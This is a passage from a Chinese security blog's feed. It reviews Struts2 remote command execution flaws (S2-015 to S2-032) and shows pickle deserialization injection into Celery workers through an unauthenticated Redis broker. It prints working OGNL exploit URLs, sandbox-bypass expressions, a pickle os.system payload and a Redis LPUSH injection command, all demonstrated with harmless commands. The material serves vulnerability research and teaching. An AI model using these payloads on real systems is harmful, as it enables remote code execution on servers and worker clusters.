class="name">result</span> <span class="attr">name</span>=<span class="string">"success"</span> <span class="attr">type</span>=<span class="string">"httpheader"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"error"</span>&gt;</span>305<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"headers.fxxk"</span>&gt;</span>$&#123;message&#125;<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里配置了 <code>&lt;param name=&quot;errorMessage&quot;&gt;${message}&lt;/param&gt;</code>，其中 <code>message</code> 为 <code>ParamAction</code> 中的一个私有变量，这样配置会导致触发该 Result 时，Struts2 会从请求参数中获取 <code>message</code> 的值，并在解析过程中，触发了 OGNL 表达式执行，因此只用提交 <code>%{1111*2}</code> 作为其变量值提交就会得到执行。这里需要注意的是这里的二次解析是因为在 <code>struts.xml</code> 中使用 <code>${param}</code> 引用了 Action 中的变量所导致的，并不针对于 <code>type=&quot;httpheader&quot;</code> 这种返回方式。</p><p><img src="/images/articles/2016-05-06-review-struts2-remote-command-execution-vulnerabilities/9.png" alt=""></p><h3 id="S2-016"><a href="#S2-016" class="headerlink" title="S2-016"></a>S2-016</h3><blockquote><p>官方链接：<a href="https://struts.apache.org/docs/s2-016.html" target="_blank" rel="noopener">https://struts.apache.org/docs/s2-016.html</a></p><p>影响版本：Struts 2.0.0 - Struts 2.3.15</p><p>修复摘要：删除 “action:”，”redirect:”，”redirectAction:” 这些前置前缀调用</p></blockquote><p><code>DefaultActionMapper</code> 类支持以 <code>action:</code>，<code>redirect:</code> 和 <code>redirectAction:</code> 作为访问前缀，前缀后面可以跟 OGNL 表达式，由于 Struts2 未对其进行过滤，导致任意 Action 可以使用这些前缀执行任意 OGNL 表达式，从而导致任意命令执行，经测试发现 <code>redirect:</code> 和 <code>redirectAction:</code> 这两个前缀比较好容易构造出命令执行的 Payload（转义后）：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://localhost:8080/S2-016/default.action?redirect:$&#123;%23context[&apos;xwork.MethodAccessor.denyMethodExecution&apos;]%3Dfalse,%23f%3D%23_memberAccess.getClass().getDeclaredField(&apos;allowStaticMethodAccess&apos;),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),@java.lang.Runtime@getRuntime().exec(&apos;open%20%2fApplications%2fCalculator.app&apos;)&#125;</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">http://localhost:8080/S2-016/default.action?redirectAction:%25&#123;(new+java.lang.ProcessBuilder(new+java.lang.String[]&#123;&apos;open&apos;,&apos;/Applications/Calculator.app&apos;&#125;)).start()&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/articles/2016-05-06-review-struts2-remote-command-execution-vulnerabilities/10.png" alt=""></p><h3 id="S2-029"><a href="#S2-029" class="headerlink" title="S2-029"></a>S2-029</h3><blockquote><p>官方链接：<a href="https://struts.apache.org/docs/s2-029.html" target="_blank" rel="noopener">https://struts.apache.org/docs/s2-029.html</a></p><p>影响版本：Struts 2.0.0 - Struts 2.3.16</p><p>修复摘要：限制传入标签属性的值，对其进行合规的正则验证</p></blockquote><p>简单的说就是当开发者在模版中使用了类似如下的标签写法时，后端 Struts2 处理时会导致二次 OGNL 表达式执行的情况：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;s:textfield name=&quot;%&#123;message&#125;&quot;&gt;&lt;/s:textfield&gt;</span><br></pre></td></tr></table></figure><p>这里需要注意的是，仅当只有 <code>name</code> 属性这样写的情况下才能触发 OGNL 表达式执行，并且该标签中不能显示写有 <code>value</code> 属性。详细分析可参考天融信阿尔法实验室的张萌所写的<a href="http://blog.topsec.com.cn/ad_lab/struts2漏洞s2-029分析/" target="_blank" rel="noopener">《struts2漏洞s2-029分析》</a></p><p>到 S2-029 这里是，Struts2 已经增加了相当多的安全检测了，所以想要直接执行命令还需要通过修改这些安全参数来绕过最后的执行检测，具体的安全参数版本差异同样可参考上面的详细分析文章。</p><p>下面测试环境使用的是 <code>Struts 2.3.24.1</code>：</p><pre><code>http://localhost:8080/S2-029/default.action?message=(%23_memberAccess[&apos;allowPrivateAccess&apos;]=true,%23_memberAccess[&apos;allowProtectedAccess&apos;]=true,%23_memberAccess[&apos;excludedPackageNamePatterns&apos;]=%23_memberAccess[&apos;acceptProperties&apos;],%23_memberAccess[&apos;excludedClasses&apos;]=%23_memberAccess[&apos;acceptProperties&apos;],%23_memberAccess[&apos;allowPackageProtectedAccess&apos;]=true,%23_memberAccess[&apos;allowStaticMethodAccess&apos;]=true,@java.lang.Runtime@getRuntime().exec(&apos;open /Applications/Calculator.app&apos;))</code></pre><p><img src="/images/articles/2016-05-06-review-struts2-remote-command-execution-vulnerabilities/12.png" alt=""></p><p>（前面提到在 S2-015 Struts 2.3.14.2 中已经删除了 <code>setAllowStaticMethodAccess</code> 方法导致无法直接赋值，但是在该测试环境中却又可以直接对 <code>_memberAccess[&#39;allowStaticMethodAccess&#39;]</code> 进行赋值了，表示有点疑惑，希望有明白的同学告知我一下）</p><h3 id="S2-032"><a href="#S2-032" class="headerlink" title="S2-032"></a>S2-032</h3><blockquote><p>官方链接：<a href="https://struts.apache.org/docs/s2-032.html" target="_blank" rel="noopener">https://struts.apache.org/docs/s2-032.html</a></p><p>影响版本：Struts 2.3.20 - Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)</p><p>修复摘要：过滤通过 method: 传入的 action 名称，限制其字符范围 protected Pattern allowedActionNames = Pattern.compile(“[a-zA-Z0-9._!/\-]*”);</p></blockquote><p>在配置了 Struts2 DMI 为 True 的情况下，可以使用 <code>method:&lt;name&gt;</code> Action 前缀去调用声明为 public 的函数，DMI 的相关使用方法可参考官方介绍（<a href="https://struts.apache.org/docs/action-configuration.html#ActionConfiguration-DynamicMethodInvocation" target="_blank" rel="noopener">Dynamic Method Invocation</a>），这个 DMI 的调用特性其实一直存在，只不过在低版本中 Strtus2 不会对 <code>name</code> 方法值做 OGNL 计算，而在高版本中会，代码详情可参考阿尔法实验室的报告 - <a href="http://blog.topsec.com.cn/ad_lab/apache-structs2-s2-032%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%E5%8F%8A%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E8%84%9A%E6%9C%AC/" target="_blank" rel="noopener">《Apache Struts2 s2-032技术分析及漏洞检测脚本》</a></p><p>要成功利用必须要开 DMI 才可以：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">"struts.enable.DynamicMethodInvocation"</span> <span class="attr">value</span>=<span class="string">"true"</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>找到目标应用有效的 Action 例如 <code>index.action</code>，那么直接使用 DMI 在 <code>method:</code> 后面带上需要执行 OGNL 表达式即可（注意转义）：</p><pre><code>http://localhost:8080/S2-032/index.action?method:%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%2C%23f%3D@java.lang.Runtime@getRuntime%28%29.exec%28%23parameters.cmd%5B0%5D%29%2C%23f.close&amp;cmd=open%20%2fApplications%2fCalculator.app</code></pre><p>这里需要注意的是后端会获取 <code>name</code> 值后拼接 <code>&quot;()&quot;</code> 形成 <code>name()</code> 然后再去执行 OGNL 表达式。</p><p>（在测试的时候，对比了前后几个版本的 Payload，发现这里并不用去修改什么安全参数就能够执行命令了，我表示对此有点不解。并且在公开的 PoC 中出现了 <a href="mailto:`#_memberAccess=@ognl.OgnlContext" target="_blank" rel="noopener">`#_memberAccess=@ognl.OgnlContext</a>@DEFAULT_MEMBER_ACCESS` 这个表达式，如果不附上会因为字符检查而执行失败，这一点是为了绕沙盒，但具体代码细节还是不太清楚）</p><h3 id="比较关键的-OGNL-表达式"><a href="#比较关键的-OGNL-表达式" class="headerlink" title="比较关键的 OGNL 表达式"></a>比较关键的 OGNL 表达式</h3><p>获取当前请求参数值（e.g. <code>http://www.example.com/index.action?a=222&amp;b=333</code>）：</p><pre><code>#parameters.a[0]  // a = 222</code></pre><p>获取当前 Response 对象，用于输出字符串到当前访问页面：</p><pre><code>#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(&quot;HelloWorld!&quot;),#response.flush(),#response.close()</code></pre><p>利用 Java 反射机制修改 <code>#_memberAccess[&#39;allowStaticMethodAccess&#39;]</code>：</p><pre><code>#context[&apos;xwork.MethodAccessor.denyMethodExecution&apos;]=false,#m=#_memberAccess.getClass().getDeclaredField(&apos;allowStaticMethodAccess&apos;),#m.setAccessible(true),#m.set(#_memberAccess,true)</code></pre><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="http://www.cnblogs.com/LittleHann/p/4606891.html" target="_blank" rel="noopener">http://www.cnblogs.com/LittleHann/p/4606891.html</a></li><li><a href="http://www.pwntester.com/blog/2014/01/21/struts-2-devmode-an-ognl-backdoor/" target="_blank" rel="noopener">http://www.pwntester.com/blog/2014/01/21/struts-2-devmode-an-ognl-backdoor/</a></li><li><a href="http://drops.wooyun.org/papers/902" target="_blank" rel="noopener">http://drops.wooyun.org/papers/902</a></li><li><a href="http://blog.topsec.com.cn/ad_lab/apache-structs2-s2-032技术分析及漏洞检测脚本/" target="_blank" rel="noopener">http://blog.topsec.com.cn/ad_lab/apache-structs2-s2-032技术分析及漏洞检测脚本/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;刚爆出 Struts2 远程命令执行 S2-032 的时候让我有点心无力，作为一名安全研究员还是不能偷懒，经典漏洞还是应该去分析回顾一下的。&lt;/p&gt;
&lt;p&gt;如果你想看的是详细的底层代码跟踪分析，那我也只能 say sorry 了。能力有限一些细节无法很好的写在这里，因为确实
      
    
    </summary>
    
    
      <category term="security" scheme="http://rickgray.me/tags/security/"/>
    
      <category term="web" scheme="http://rickgray.me/tags/web/"/>
    
      <category term="java" scheme="http://rickgray.me/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>定时炸弹 - MQ 代理中危险的序列化数据</title>
    <link href="http://rickgray.me/2016/04/08/serialization-troubles-in-message-queuing-componet/"/>
    <id>http://rickgray.me/2016/04/08/serialization-troubles-in-message-queuing-componet/</id>
    <published>2016-04-07T16:00:00.000Z</published>
    <updated>2018-04-24T15:48:57.518Z</updated>
    
    <content type="html"><![CDATA[<p>分布式应用中消息队列使用特别广泛，而针对分布式集群的攻击常常是点到面的扩散，突破关键点从而控制整个集群。在使用消息队列传递消息时，不安全的数据序列化方式便为整体系统埋下了一颗定时炸弹，一旦消息代理中间件被攻破就会导致整个工作节点沦陷。</p><p><strong>（本文只对可行思路进行阐述，如有不恰当之处，还望指出）</strong></p><h3 id="一、消息队列与数据序列化"><a href="#一、消息队列与数据序列化" class="headerlink" title="一、消息队列与数据序列化"></a>一、消息队列与数据序列化</h3><h4 id="1-消息队列代理"><a href="#1-消息队列代理" class="headerlink" title="1. 消息队列代理"></a>1. 消息队列代理</h4><p>在一个分布式系统中，消息队列（MQ）是必不可少的，任务下发到消息队列代理中，工作节点从队列中取出相应的任务进行处理，以图的形式展现出来是这个样子的：</p><p><img src="/images/articles/2016-04-07-serialization-troubles-in-message-queuing-componet/1.png" alt=""></p><p>任务通过 Master 下发到消息队列代理中，Workers 从队列中取出任务然后进行解析和处理，按照配置对执行结果进行返回。下面以 Python 中的分布式任务调度框架 <a href="celeryproject.org">Celery</a> 来进行代码说明，其中使用了 Redis 作为消息队列代理：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> celery <span class="keyword">import</span> Celery</span><br><span class="line"></span><br><span class="line">app = Celery(<span class="string">'demo'</span>,</span><br><span class="line">             broker=<span class="string">'redis://:@192.168.199.149:6379/0'</span>,</span><br><span class="line">             backend=<span class="string">'redis://:@192.168.199.149:6379/0'</span>)</span><br><span class="line"><span class="meta">@app.task</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> x + y</span><br></pre></td></tr></table></figure><p>在本地起一个 Worker 用以执行注册好的 <code>add</code> 方法：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(env)➜  demo celery worker -A demo.app -l INFO</span><br></pre></td></tr></table></figure><p>然后起一个 Python 交互式终端下发任务并获取执行结果：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(env)➜  ipython --no-banner</span><br><span class="line"></span><br><span class="line">In [<span class="number">1</span>]: <span class="keyword">from</span> demo <span class="keyword">import</span> add</span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: <span class="keyword">print</span> add.delay(<span class="number">1</span>, <span class="number">2</span>).get()</span><br><span class="line"><span class="number">21</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]:</span><br></pre></td></tr></table></figure><p><img src="/images/articles/2016-04-07-serialization-troubles-in-message-queuing-componet/2.png" alt=""></p><p>借助消息队列这种方式很容易把一个单机的系统改造成一个分布式的集群系统。</p><h4 id="2-数据序列化"><a href="#2-数据序列化" class="headerlink" title="2. 数据序列化"></a>2. 数据序列化</h4><p>任务的传递肯定是具有一定结构的数据，而这些数据的结构化处理就要进行序列化操作了。不同语言有不同的数据序列化方式，当然也有着具有兼容性的序列化方式（比如：JSON），下面针对序列化数据存储的形式列举了常见的一些数据序列化方式：</p><ol><li>Binary</li><li>JSON</li><li>XML (SOAP)</li></ol><p>二进制序列化常是每种语言内置实现的一套针对自身语言特性的对象序列化处理方式，通过二进制序列化数据通常能够轻易的在不同的应用和系统中传递实时的实例化对象数据，包括了类实例、成员变量、类方法等。</p><p>JSON 形式的序列化通常只能传递基础的数据结构，比如数值、字符串、列表、字典等等，不支持某些自定义类实例的传递。XML 形式的序列化也依赖于特定的语言实现。</p><h3 id="二、危险的序列化方式"><a href="#二、危险的序列化方式" class="headerlink" title="二、危险的序列化方式"></a>二、危险的序列化方式</h3><p>说了那么多，最终还是回到了序列化方式上，二进制方式的序列化是最全的也是最危险的一种序列化方式，许多语言的二进制序列化方式都存在着一些安全风险（如：Python, C#, Java）。</p><p>在分布式系统中使用二进制序列化数据进行任务信息传递，极大地提升了整个系统的危险系数，犹如一枚炸弹放在那里，不知道什么时候就 “爆炸” 致使整个系统沦陷掉。</p><p>下面还是以 Python 的 Celery 分布式任务调度框架来说明该问题。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> celery <span class="keyword">import</span> Celery</span><br><span class="line">app = Celery(<span class="string">'demo'</span>, broker=<span class="string">'redis://:@192.168.199.149:6379/0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.task</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> x + y</span><br></pre></td></tr></table></figure><p>（这里是用 Redis 作为消息队列代理，为了方便未开启验证）</p><p>首先不起 Worker 节点，直接添加一个 <code>add</code> 任务到队列中，看看下发的任务是如何存储的：</p><p><img src="/images/articles/2016-04-07-serialization-troubles-in-message-queuing-componet/3.png" alt=""></p><p>可以看到在 Redis 中存在两个键 <code>celery</code> 和 <code>_kombu.binding.celery</code>，<code>_kombu.binding.celery</code> 表示有一名为 <code>celery</code> 的任务队列（Celery 默认），而 <code>celery</code> 为默认队列中的任务列表，可以看看添加进去的任务数据：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; LINDEX celery 0</span><br><span class="line">&quot;&#123;\&quot;body\&quot;: \&quot;gAJ9cQEoVQdleHBpcmVzcQJOVQN1dGNxA4hVBGFyZ3NxBEsBSxaGcQVVBWNob3JkcQZOVQljYWxsYmFja3NxB05VCGVycmJhY2tzcQhOVQd0YXNrc2V0cQlOVQJpZHEKVSQ3M2I5Y2FmZS0xYzhkLTRmZjYtYjdhOC00OWI2MGJmZjE0ZmZxC1UHcmV0cmllc3EMSwBVBHRhc2txDVUIZGVtby5hZGRxDlUJdGltZWxpbWl0cQ9OToZVA2V0YXEQTlUGa3dhcmdzcRF9cRJ1Lg==\&quot;, \&quot;headers\&quot;: &#123;&#125;, \&quot;content-type\&quot;: \&quot;application/x-python-serialize\&quot;, \&quot;properties\&quot;: &#123;\&quot;body_encoding\&quot;: \&quot;base64\&quot;, \&quot;correlation_id\&quot;: \&quot;73b9cafe-1c8d-4ff6-b7a8-49b60bff14ff\&quot;, \&quot;reply_to\&quot;: \&quot;b6c304bb-45e5-3b27-95dc-29335cbce9f1\&quot;, \&quot;delivery_info\&quot;: &#123;\&quot;priority\&quot;: 0, \&quot;routing_key\&quot;: \&quot;celery\&quot;, \&quot;exchange\&quot;: \&quot;celery\&quot;&#125;, \&quot;delivery_mode\&quot;: 2, \&quot;delivery_tag\&quot;: \&quot;0ad4f731-e5d3-427c-a6d6-d0fe48ff2b09\&quot;&#125;, \&quot;content-encoding\&quot;: \&quot;binary\&quot;&#125;&quot;</span><br><span class="line">127.0.0.1:6379&gt;</span><br></pre></td></tr></table></figure><p>为了方便分析，把上面的数据整理一下：</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> 'body': 'gAJ9cQEoVQdleHBpcmVzcQJOVQN1dGNxA4hVBGFyZ3NxBEsBSxaGcQVVBWNob3JkcQZOVQljYWxsYmFja3NxB05VCGVycmJhY2tzcQhOVQd0YXNrc2V0cQlOVQJpZHEKVSQ3M2I5Y2FmZS0xYzhkLTRmZjYtYjdhOC00OWI2MGJmZjE0ZmZxC1UHcmV0cmllc3EMSwBVBHRhc2txDVUIZGVtby5hZGRxDlUJdGltZWxpbWl0cQ9OToZVA2V0YXEQTlUGa3dhcmdzcRF9cRJ1Lg==',</span><br><span class="line"> 'content-encoding': 'binary',</span><br><span class="line"> 'content-type': 'application/x-python-serialize',</span><br><span class="line"> 'headers': &#123;&#125;,</span><br><span class="line"> 'properties': &#123;</span><br><span class="line">                'body_encoding': 'base64',</span><br><span class="line">                'correlation_id': '73b9cafe-1c8d-4ff6-b7a8-49b60bff14ff',</span><br><span class="line">                'delivery_info': &#123;</span><br><span class="line">                                  'exchange': 'celery',</span><br><span class="line">                                  'priority': 0,</span><br><span class="line">                                  'routing_key': 'celery'</span><br><span class="line">                                  &#125;,</span><br><span class="line">                'delivery_mode': 2,</span><br><span class="line">                'delivery_tag': '0ad4f731-e5d3-427c-a6d6-d0fe48ff2b09',</span><br><span class="line">                'reply_to': 'b6c304bb-45e5-3b27-95dc-29335cbce9f1'</span><br><span class="line">               &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>body</code> 存储的经过序列化和编码后的数据，是具体的任务参数，其中包括了需要执行的方法、参数和一些任务基本信息，而 <code>properties[&#39;body_encoding&#39;]</code> 指明的是 <code>body</code> 的编码方式，在 Worker 取到该消息时会使用其中的编码进行解码得到序列化后的任务数据 <code>body.decode(&#39;base64&#39;)</code>，而 <code>content-type</code> 指明了任务数据的序列化方式，这里在不明确指定的情况下 Celery 会使用 Python 内置的序列化实现模块 <code>pickle</code> 来进行序列化操作。</p><p>这里将 <code>body</code> 的内容提取出来，先使用 base64 解码再使用 pickle 进行反序列化来看看具体的任务信息：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">In [<span class="number">6</span>]: pickle.loads(<span class="string">'gAJ9cQEoVQdleHBpcmVzcQJOVQN1dGNxA4hVBGFyZ3NxBEsBSxaGcQVVBWNob3JkcQZOVQljYWxsYmFja3NxB05VCGVycmJhY2tzcQhOVQd0YXNrc2V0cQlOVQJpZHEKVSQ3M2I5Y2FmZS0xYzhkLTRmZjYtYjdhOC00OWI2MGJmZjE0ZmZxC1UHcmV0cmllc3EMSwBVBHRhc2txDVUIZGVtby5hZGRxDlUJdGltZWxpbWl0cQ9OToZVA2V0YXEQTlUGa3dhcmdzcRF9cRJ1Lg=='</span>.decode(<span class="string">'base64'</span>))</span><br><span class="line">Out[<span class="number">6</span>]:</span><br><span class="line">&#123;<span class="string">'args'</span>: (<span class="number">1</span>, <span class="number">22</span>),</span><br><span class="line"> <span class="string">'callbacks'</span>: <span class="keyword">None</span>,</span><br><span class="line"> <span class="string">'chord'</span>: <span class="keyword">None</span>,</span><br><span class="line"> <span class="string">'errbacks'</span>: <span class="keyword">None</span>,</span><br><span class="line"> <span class="string">'eta'</span>: <span class="keyword">None</span>,</span><br><span class="line"> <span class="string">'expires'</span>: <span class="keyword">None</span>,</span><br><span class="line"> <span class="string">'id'</span>: <span class="string">'73b9cafe-1c8d-4ff6-b7a8-49b60bff14ff'</span>,</span><br><span class="line"> <span class="string">'kwargs'</span>: &#123;&#125;,</span><br><span class="line"> <span class="string">'retries'</span>: <span class="number">0</span>,</span><br><span class="line"> <span class="string">'task'</span>: <span class="string">'demo.add'</span>,</span><br><span class="line"> <span class="string">'taskset'</span>: <span class="keyword">None</span>,</span><br><span class="line"> <span class="string">'timelimit'</span>: (<span class="keyword">None</span>, <span class="keyword">None</span>),</span><br><span class="line"> <span class="string">'utc'</span>: <span class="keyword">True</span>&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="number">7</span>]:</span><br></pre></td></tr></table></figure><p>熟悉 Celery 的人一眼就知道上面的这些参数信息都是在下发任务时进行指定的：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id =&gt; 任务的唯一ID</span><br><span class="line">task =&gt; 需要执行的任务</span><br><span class="line">args =&gt; 调用参数</span><br><span class="line">callback =&gt; 任务完成后的回调</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>这里详细任务参数就不进行说明了，刚刚说到了消息队列代理中存储的任务信息是用 Python 内置的 <code>pickle</code> 模块进行序列化的，那么如果我恶意插入一个假任务，其中包含了恶意构造的序列化数据，在 Worker 端取到任务后对信息进行反序列化的时候是不是就能够执行任意代码了呢？下面就来验证这个观点（对 Python 序列化攻击不熟悉的可以参考下这篇文章<a href="https://blog.nelhage.com/2011/03/exploiting-pickle/" target="_blank" rel="noopener">《Exploiting Misuse of Python’s “Pickle”》</a>）</p><p>刚刚测试和分析已经得知往 <code>celery</code> 队列中下发的任务，<code>body</code> 最终会被 Worker 端进行解码和解析，并在该例子中 <code>body</code> 的数据形态为 <code>pickle.dumps(TASK).encode(&#39;base64&#39;)</code>，所以这里可以不用管 <code>pickle.dumps(TASK)</code> 的具体数据，直接将恶意的序列化数据经过 base64 编码后替换掉原来的数据，这里使用的 Payload 为：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Touch</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">import</span> os</span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="string">'touch /tmp/evilTask'</span>, ))</span><br><span class="line"><span class="keyword">print</span> pickle.dumps(Touch()).encode(<span class="string">'base64'</span>)</span><br></pre></td></tr></table></figure><p>运行一下得到具体的 Payload 值：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(env)➜  demo python touch.py</span><br><span class="line">Y3Bvc2l4CnN5c3RlbQpwMAooUyd0b3VjaCAvdG1wL2V2aWxUYXNrJwpwMQp0cDIKUnAzCi4=</span><br></pre></td></tr></table></figure><p>将其替换原来的 <code>body</code> 值得到：</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> 'body': 'Y3Bvc2l4CnN5c3RlbQpwMAooUyd0b3VjaCAvdG1wL2V2aWxUYXNrJwpwMQp0cDIKUnAzCi4=',</span><br><span class="line"> 'content-encoding': 'binary',</span><br><span class="line"> 'content-type': 'application/x-python-serialize',</span><br><span class="line"> 'headers': &#123;&#125;,</span><br><span class="line"> 'properties': &#123;</span><br><span class="line">                'body_encoding': 'base64',</span><br><span class="line">                'correlation_id': '73b9cafe-1c8d-4ff6-b7a8-49b60bff14ff',</span><br><span class="line">                'delivery_info': &#123;</span><br><span class="line">                                  'exchange': 'celery',</span><br><span class="line">                                  'priority': 0,</span><br><span class="line">                                  'routing_key': 'celery'</span><br><span class="line">                                  &#125;,</span><br><span class="line">                'delivery_mode': 2,</span><br><span class="line">                'delivery_tag': '0ad4f731-e5d3-427c-a6d6-d0fe48ff2b09',</span><br><span class="line">                'reply_to': 'b6c304bb-45e5-3b27-95dc-29335cbce9f1'</span><br><span class="line">               &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>转换为字符串：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&#123;\&quot;body\&quot;: \&quot;Y3Bvc2l4CnN5c3RlbQpwMAooUyd0b3VjaCAvdG1wL2V2aWxUYXNrJwpwMQp0cDIKUnAzCi4=\&quot;, \&quot;headers\&quot;: &#123;&#125;, \&quot;content-type\&quot;: \&quot;application/x-python-serialize\&quot;, \&quot;properties\&quot;: &#123;\&quot;body_encoding\&quot;: \&quot;base64\&quot;, \&quot;delivery_info\&quot;: &#123;\&quot;priority\&quot;: 0, \&quot;routing_key\&quot;: \&quot;celery\&quot;, \&quot;exchange\&quot;: \&quot;celery\&quot;&#125;, \&quot;delivery_mode\&quot;: 2, \&quot;correlation_id\&quot;: \&quot;73b9cafe-1c8d-4ff6-b7a8-49b60bff14ff\&quot;, \&quot;reply_to\&quot;: \&quot;b6c304bb-45e5-3b27-95dc-29335cbce9f1\&quot;, \&quot;delivery_tag\&quot;: \&quot;0ad4f731-e5d3-427c-a6d6-d0fe48ff2b09\&quot;&#125;, \&quot;content-encoding\&quot;: \&quot;binary\&quot;&#125;&quot;</span><br></pre></td></tr></table></figure><p>然后将该信息直接添加到 Redis 的 队列名为 <code>celery</code> 的任务列表中（注意转义）：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; LPUSH celery &quot;&#123;\&quot;body\&quot;: \&quot;Y3Bvc2l4CnN5c3RlbQpwMAooUyd0b3VjaCAvdG1wL2V2aWxUYXNrJwpwMQp0cDIKUnAzCi4=\&quot;, \&quot;headers\&quot;: &#123;&#125;, \&quot;content-type\&quot;: \&quot;application/x-python-serialize\&quot;, \&quot;properties\&quot;: &#123;\&quot;body_encoding\&quot;: \&quot;base64\&quot;, \&quot;delivery_info\&quot;: &#123;\&quot;priority\&quot;: 0, \&quot;routing_key\&quot;: \&quot;celery\&quot;, \&quot;exchange\&quot;: \&quot;celery\&quot;&#125;, \&quot;delivery_mode\&quot;: 2, \&quot;correlation_id\&quot;: \&quot;73b9cafe-1c8d-4ff6-b7a8-49b60bff14ff\&quot;, \&quot;reply_to\&quot;: \&quot;b6c304bb-45e5-3b27-95dc-29335cbce9f1\&quot;, \&quot;delivery_tag\&quot;: \&quot;0ad4f731-e5d3-427c-a6d6-d0fe48ff2b09\&quot;&#125;, \&quot;content-encoding\&quot;: \&quot;binary\&quot;&#125;&quot;</span><br></pre></td></tr></table></figure><p>这时候再起一个默认队列的 Worker 节点，Worker 从 MQ 中取出任务信息并解析我们的恶意数据，如果成功执行了会在 Worker 节点创建文件 <code>/tmp/evilTask</code>：</p><p><img src="/images/articles/2016-04-07-serialization-troubles-in-message-queuing-componet/4.png" alt=""></p><p>攻击流程就应该为：</p><p><img src="/images/articles/2016-04-07-serialization-troubles-in-message-queuing-componet/5.png" alt=""></p><p>攻击者控制了 MQ 服务器，并且在任务数据传输上使用了危险的序列化方式，致使攻击者能够往队列中注入恶意构造的任务，Worker 节点在解析和执行 fakeTask 时发生异常或直接被攻击者控制。</p><h3 id="三、脆弱的消息队列代理"><a href="#三、脆弱的消息队列代理" class="headerlink" title="三、脆弱的消息队列代理"></a>三、脆弱的消息队列代理</h3><p>虽然大多数集群消息队列代理都处在内网环境，但并不排除其在公网上暴露可能性，历史上已经多次出现过消息队列代理未授权访问的问题（默认配置），像之前的 MongoDB 和 Redis 默认配置下的未授权访问漏洞，都已经被大量的曝光和挖掘过了，但是这些受影响的目标中又有多少是作为消息队列代理使用的呢，恐怕当时并没有太多人注意到这个问题。</p><p>鉴于一些安全问题，并未对暴露在互联网上的 Redis 和 MongdoDB 进行扫描检测。</p><p>这里总结一下利用 MQ 序列化数据注入的几个关键点：</p><ol><li>使用了危险序列化方式进行消息传输的消息队列代理；</li><li>工作集群会从 MQ 中取出消息并对其反序列化解析；</li><li>消息队列代理能够被攻击和控制；</li></ol><p>虽然成功利用本文思路进行攻击的条件比较苛刻，但是互联网那么大没有什么是不可能的。我相信在不久之后必定会出现真实案例来证实本文所讲的内容。<strong>（在本文完成时，发现 2013 年国外已经有了这样的案例，链接附后）</strong></p><h3 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h3><p>数据注入是一种常用的攻击手法，如何熟练地借用老手法玩出新思路是需要积累的。文章示例代码虽然只给出了 Python Pickle + Celery 这个组合的利用思路，但并不局限于此。开发语言和中间件那么多，组合也更多，好玩的东西需要一起去发掘。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://groups.google.com/forum/#!topic/celery-users/uptHlL3cBs0" target="_blank" rel="noopener">https://groups.google.com/forum/#!topic/celery-users/uptHlL3cBs0</a></li><li><a href="http://andresriancho.github.io/nimbostratus/" target="_blank" 